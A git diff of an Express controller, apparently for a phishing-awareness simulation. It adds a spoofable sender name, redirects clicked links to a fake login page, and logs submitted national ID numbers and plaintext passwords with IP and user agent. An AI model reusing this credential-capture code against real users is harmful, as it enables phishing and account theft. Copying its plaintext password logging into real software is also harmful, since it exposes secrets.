@@ -2,6 +2,7 @@ import fs from "fs";
 import path from "path";
 import { fileURLToPath } from 'url';
 import { dirname } from 'path';
+import { emailConfig } from "../config/configEnv.js";
 import { sendEmail } from "../services/email.services.js";
 import {
     handleErrorServer,
@@ -13,7 +14,9 @@ const __dirname = dirname(__filename);
 
 export const sendCustomEmail = async (req, res) => {
 
-    const { email, subject, message } = req.body;
+    const { email, subject, message, fromName } = req.body;
+
+    const sender = `"${fromName}" <${emailConfig.user}>`;
 
     const campaignId = "camp1";
     const userId = encodeURIComponent(email);
@@ -27,6 +30,7 @@ export const sendCustomEmail = async (req, res) => {
 
     try {
         const info = await sendEmail(
+            sender,
             email,
             subject,
             message,
@@ -57,7 +61,7 @@ export const trackClick = (req, res) => {
 
     fs.appendFile(logPath, logLine, (err) => {
         if (err) {
-          console.error("Error al registrar clic:", err);  
+            console.error("Error al registrar clic:", err);  
         } else {
 
             console.log("Click registrado!!");
@@ -68,28 +72,28 @@ export const trackClick = (req, res) => {
         }
     });
 
-    res.redirect("http://localhost:5173"); // link de prueba
+    res.redirect("http://localhost:5173/fake-login"); // link de prueba
 };
 
 export const simularLogin = (req, res) => {
-  const { rut, password } = req.body;
-  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-  const agent = req.headers['user-agent'];
-  const timestamp = new Date().toISOString();
+    const { rut, password } = req.body;
+    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+    const agent = req.headers['user-agent'];
+    const timestamp = new Date().toISOString();
 
-  const logLine = `${timestamp} | [LOGIN SIMULADO] RUT: ${rut} | PASS: ${password} | IP: ${ip} | Agent: ${agent}\n`;
+    const logLine = `${timestamp} | [LOGIN SIMULADO] RUT: ${rut} | PASS: ${password} | IP: ${ip} | Agent: ${agent}\n`;
 
-  const logPath = path.resolve(__dirname, "../../logs/clicks.log");
+    const logPath = path.resolve(__dirname, "../../logs/clicks.log");
 
 
-  fs.appendFile(logPath, logLine, (err) => {
-    if (err) {
-      console.error("Error al registrar login u.u :", err);
-      return res.status(500).json({ error: "Error al registrar" });
-    }
+    fs.appendFile(logPath, logLine, (err) => {
+        if (err) {
+            console.error("Error al registrar login u.u :", err);
+            return res.status(500).json({ error: "Error al registrar" });
+        }
 
-    console.log("Login registrado:");
-    console.log(logLine);
-    res.status(200).json({ success: true });
-  });
+        console.log("Login registrado:");
+        console.log(logLine);
+        res.status(200).json({ success: true });
+    });
 };
